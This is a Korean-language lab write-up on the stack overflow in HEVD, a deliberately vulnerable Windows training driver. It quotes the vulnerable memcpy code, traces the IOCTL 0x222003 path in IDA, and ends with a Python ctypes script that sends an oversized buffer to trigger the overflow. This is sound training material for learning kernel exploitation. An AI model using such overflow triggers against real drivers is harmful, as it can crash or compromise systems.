# Part 1. StackOverflow
[hacksysteam site]: https://rootkits.xyz/blog/2017/08/kernel-stack-overflow/

## 1. Analysis
제공 된 HEVD drive의 소스코드 중 StackOverflow.c 코드를 보면 vulnerable code 와 secure code가 나뉘어 있다.

\`

        #ifdef SECURE
        // Secure Note: This is secure because the developer is passing a size
        // equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence,
        // there will be no overflow
        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, sizeof(KernelBuffer));

        #else
        DbgPrint("[+] Triggering Stack Overflow\n");

        // Vulnerability Note: This is a vanilla Stack based Overflow vulnerability
        // because the developer is passing the user supplied size directly to
        // RtlCopyMemory()/memcpy() without validating if the size is greater or
        // equal to the size of KernelBuffer
        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);
\`

* RtlCopyMemory(argv1.argv2,argv3); 은 argv3에 지정 한 길이만큼 argv2의 내용을 argv1의 주소에 Copy한다.
* Secure Note : argv3을 Copy 될 버퍼의 Size만큼 지정했기 때문에 Overflow에 안전하다.
* Vulnerability Note : Copy 될 Size를 UserBuffer(argv2)의 Size 만큼 지정해주면, 사용자가 입력한 Data의 length 만큼 Copy 되어 Overflow가 발생할 수 있다. 


스택 오버플로 모듈이 어떻게 그리고 어디서 트리거되는지 이해하기 위해 IDA Pro의 드라이버를 분석해보자

![1](https://user-images.githubusercontent.com/35731091/45018850-e1b94100-b065-11e8-9d51-ffc939c23413.png)

흐름을 보았을 때, IrpDeviceIoCtlHandler() function에서 StackOverflowIoctlHandler()를 Call, 최종적으로 취약점이 있는 TriggerStackOverflow() 까지 호출 하는 것을 볼 수 있다.

![2](https://user-images.githubusercontent.com/35731091/45018851-e1b94100-b065-11e8-9a67-9b592b250b50.png)

IrpDeviceIoCtlHandler()에서 StackOverflowIoctlHandler()를 거쳐, TriggerStackOverflow() 까지 호출하기 위해서는 IOCTL이 0x222003이 되어야한다.

IOCTL은 기본 운영 체제의 컴퓨터 User와 Kernel을 잇는 인터페이스의 일부이다.파일 디스크립터를 가지고 Device의 read/write와 기타 장치들을 control하기 위해 사용된다.
HW에 데이터를 read/write할 때 일반적으로 read(),write()함수의 동작만으로는 HW의 동작 상태에 따라 처리하지 못하는 데이터가 종종 발생하기 때문에, kernel 내부에서는 IOCTL을 이용한다.


![3](https://user-images.githubusercontent.com/35731091/45018853-e1b94100-b065-11e8-8a5c-7042eeabc963.png)

최종적으로, IOCTL이 0x222003이 되면  TriggerStackOverflow() 함수 내부의 memcpy()에서 취약점이 발생하여 exploitable 하다.

## 2.Exploit

앞서 ## 1.Analysis 에서 취약한 부분(Vulnerability)을 호출하기 위해서는 IOCTL이 0x222003이 되야한다고 했다.
Python 언어의 DeviceIoControl() API를 이용하여 우리는 원하는 Driver와 서로 Interact 할 수 있다. 이를 이용하여 최종적으로 exploit이 가능하다.

\`

        import ctypes, sys
        from ctypes import *

        kernel32 = windll.kernel32
        hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",0xC0000000,0,None,0x3,0,None)

        print "Return : "+str(hevDevice)
        if not hevDevice or hevDevice == -1:
	        print "*** Couldn`t get Device Driver handle."
	        sys.exit(0)

        buf = "A"*2048+"B"*4+"C"*0x100
        bufLength = len(buf)

        print "Buf length: "+str(len(bufLength))
        kernel32.DeviceIoControl(hevDevice,0x222003,buf,bufLength,None,0,byref(c_ulong()),None) 
\`




